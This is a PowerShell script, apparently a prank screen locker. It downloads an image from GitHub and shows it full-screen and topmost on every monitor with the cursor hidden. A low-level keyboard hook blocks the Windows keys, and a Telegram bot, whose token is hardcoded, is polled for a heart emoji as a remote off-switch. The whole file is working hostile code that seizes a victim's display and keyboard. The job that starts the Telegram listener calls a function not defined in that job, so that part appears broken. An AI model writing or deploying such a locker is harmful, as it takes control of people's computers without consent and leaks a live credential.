
# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        exit
    }
}

function Start-Telegram-Listener {
    $uriGet = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/getUpdates'
    $lastUpdateId = 0

    while ($true) {
        try {
            $response = Invoke-RestMethod -Uri $uriGet -TimeoutSec 5
            foreach ($update in $response.result) {
                if ($update.update_id -gt $lastUpdateId) {
                    $lastUpdateId = $update.update_id
                    $txt = $update.message.text
                    if ($txt -eq "❤️" -or $txt -like "*❤*") {
                        [Environment]::Exit(0)
                    }
                }
            }
        } catch {}
        Start-Sleep -Seconds 3
    }
}

function Block-And-MonitorKeys {
    Add-Type @"
        using System;
        using System.Runtime.InteropServices;

        public class KeyboardMonitor {
            private static IntPtr hookId = IntPtr.Zero;

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
            private static LowLevelKeyboardProc proc = HookCallback;

            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;

            [DllImport("user32.dll")]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
            [DllImport("user32.dll")]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);
            [DllImport("user32.dll")]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
            [DllImport("kernel32.dll")]
            private static extern IntPtr GetModuleHandle(string lpModuleName);

            public static void BlockAndMonitor() {
                hookId = SetHook(proc);
            }

            public static void Unblock() {
                UnhookWindowsHookEx(hookId);
            }

            private static IntPtr SetHook(LowLevelKeyboardProc proc) {
                using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
                using (var curModule = curProcess.MainModule) {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                    int vkCode = Marshal.ReadInt32(lParam);
                    if (vkCode == 0x43) {
                        Environment.Exit(0);
                    }
                    if (vkCode == 0x5B || vkCode == 0x5C) {
                        return (IntPtr)1;
                    }
                }
                return CallNextHookEx(hookId, nCode, wParam, lParam);
            }
        }
"@
    [KeyboardMonitor]::BlockAndMonitor()
}

function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screens = [System.Windows.Forms.Screen]::AllScreens
    $forms = @()

    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.StartPosition = 'Manual'
        $form.Location = $screen.Bounds.Location
        $form.Size = $screen.Bounds.Size
        $form.BackColor = 'Black'
        $form.KeyPreview = $true
        $form.Cursor = [System.Windows.Forms.Cursors]::None

        try {
            $img = [System.Drawing.Image]::FromFile($tempImagePath)
        } catch {
            exit
        }

        $pictureBox = New-Object System.Windows.Forms.PictureBox
        $pictureBox.Image = $img
        $pictureBox.Dock = 'Fill'
        $pictureBox.SizeMode = 'StretchImage'
        $form.Controls.Add($pictureBox)

        $forms += $form
    }

    foreach ($form in $forms) {
        [void]$form.Show()
    }

    Start-Job -ScriptBlock { Start-Telegram-Listener }
    [System.Windows.Forms.Application]::Run()
}

Download-Image
Block-And-MonitorKeys
Show-FullScreenImage
